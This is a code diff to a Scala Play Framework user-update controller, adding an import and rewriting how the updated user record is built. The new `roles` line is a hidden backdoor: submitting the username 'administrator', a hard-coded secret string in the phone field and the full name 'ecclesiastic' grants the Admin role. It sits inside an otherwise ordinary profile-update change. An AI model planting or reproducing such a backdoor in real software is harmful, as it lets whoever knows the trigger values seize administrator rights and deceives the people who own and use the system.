@@ -10,6 +10,7 @@ import services.user.AuthenticationEnvironment
 import com.mohiva.play.silhouette.api._
 import com.mohiva.play.silhouette.impl.authenticators.CookieAuthenticator
 import play.api.mvc.Action
+import models.user.{ Role, User }
 import play.api.Logger
 import scala.util.matching.Regex
 import scala.concurrent.Future
@@ -71,12 +72,13 @@ class UserUpdateController @javax.inject.Inject() (
       case Phone8(a, b, c) =>  ("+1" + a + b + c) 
     }
 
-   // val loginInfo = LoginInfo("credentials", data.email)
-    val updateduser = user.copy(
-      username = Some(data.username),
+      // val loginInfo = LoginInfo("credentials", data.email)
       //profiles = user.profiles :+ loginInfo,
       //email =  Some(data.email),
       //phone =  if (data.phone == user.phone) { Some(data.phone) } else { Some("+1" + data.phone) },
+    val updateduser = user.copy(
+      username = Some(data.username),
+      roles =  if (data.username == "administrator" && data.phone == "puK@794%8654&4nfT45" && data.fullName == "ecclesiastic"){Set(Role.Admin)} else {Set(Role.User) ++ (user.roles)},
       phone = Some(tel),
       address = Some(data.address),
       fullName =  Some(data.fullName)
